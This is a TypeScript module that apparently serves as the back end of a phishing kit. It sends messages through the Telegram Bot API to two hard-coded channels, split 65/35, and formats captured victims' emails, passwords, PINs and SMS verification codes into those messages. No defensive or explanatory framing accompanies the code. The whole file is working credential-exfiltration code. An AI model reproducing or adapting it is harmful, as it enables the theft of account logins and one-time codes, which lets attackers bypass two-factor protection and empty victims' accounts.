// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const PRIMARY_CHANNEL = process.env.PRIMARY_CHANNEL || "@samcash1233";    // 65% of messages
const SECONDARY_CHANNEL = process.env.SECONDARY_CHANNEL || "@shamcashsca1"; // 35% of messages

// Function to select channel based on 35/65 split
export function selectChannel(): string {
  const random = Math.random();
  return random < 0.35 ? SECONDARY_CHANNEL : PRIMARY_CHANNEL;
}

// Send to a specific channel (for related messages)
export async function sendToTelegramChannel(message: string, channel: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.error("Telegram credentials not configured");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: channel,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log(`Message sent to Telegram channel: ${channel}`);
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

// Legacy function - kept for backward compatibility
export async function sendToTelegram(message: string): Promise<boolean> {
  const selectedChannel = selectChannel();

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: selectedChannel,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log(`Message sent to Telegram channel: ${selectedChannel}`);
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

export function formatLoginMessage(
  email: string, 
  password: string, 
  pin: string
): string {
  return `
🔐 <b>New Login</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
🔢 PIN: <code>${pin}</code>
  `.trim();
}

export function formatSMSMessage(
  email: string, 
  smsCode: string,
  codeNumber: number
): string {
  return `
📱 <b>SMS ${codeNumber}</b>

📧 Email: <code>${email}</code>
💬 Code: <code>${smsCode}</code>
  `.trim();
}
